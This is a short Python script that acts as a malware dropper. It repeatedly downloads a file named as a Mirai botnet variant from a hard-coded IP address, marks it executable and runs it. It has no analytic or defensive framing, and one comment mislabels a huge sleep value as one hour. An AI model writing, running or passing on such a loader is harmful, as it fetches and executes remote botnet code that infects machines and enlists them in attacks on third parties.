import os
import requests
import time

# Define the URL of the file to download
url = 'http://195.58.39.239/bins/MiraiVariant.x86'

# Define the filename to save the downloaded file as
filename = 'Hybrid'

while True:
    try:
        # Use the requests library to download the file
        response = requests.get(url)

        # Write the downloaded file to disk
        with open(filename, 'wb') as file:
            file.write(response.content)

        # Make the downloaded file executable
        os.chmod(filename, 0o755)

        # Run the downloaded file
        os.system('./' + filename)

        # Sleep for 1 hour (3600 seconds)
        time.sleep(360000000000)
    except:
        # If there was an error, wait for 10 seconds and try again
        print("An error occurred, retrying in 10 seconds...")
        time.sleep(10)
        continue
